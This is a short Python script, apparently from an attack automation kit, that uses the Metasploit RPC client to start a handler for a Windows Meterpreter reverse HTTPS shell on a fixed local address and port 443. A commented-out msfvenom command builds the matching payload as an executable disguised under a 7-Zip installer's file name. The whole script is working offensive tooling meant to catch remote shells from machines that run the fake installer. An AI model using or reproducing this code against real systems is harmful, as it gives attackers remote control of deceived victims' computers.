from library.pymetasploit3.msfrpc import MsfRpcClient
import subprocess

def init(client):
    #Create exe payload using msfvenom
    #print("[-] Creating exe payload using msfvenom")
    #subprocess.call("msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.5 LPORT=443 -f exe > 7z1900-x64.exe",shell=True)
    
    fail=''
    handler=''
    exploithandler = client.modules.use('exploit','multi/handler')
    exploithandler['ExitOnSession'] = False
    httpspl = client.modules.use('payload','windows/x64/meterpreter/reverse_https')
    httpspl['LHOST'] = '192.168.1.5'
    httpspl['LPORT'] = '443'
    print("[*] Setting up handler...")
    cid = client.consoles.console().cid
    #print(cid)
    output = (client.consoles.console(cid).run_module_with_output_background(exploithandler, payload=httpspl).split('['))
    #print(output)
    #print(len(output))
    x=1
    while x < len(output): 
        #print(output[x])
        if "Exploit failed:" in output[x]:
            snippet=output[x]
            #print(snippet)
            fail = snippet.split('Exploit failed: ')
        x+=1
    if(len(fail)>1):
        handler = "Handler failed to start...is there a server using port {}?".format(httpspl['LPORT'])
    else:
        handler = "Handler started successfully"
    print("[+] " + handler)

if __name__ == '__main__':
    client = MsfRpcClient('123',port=55552)
    start=init(client)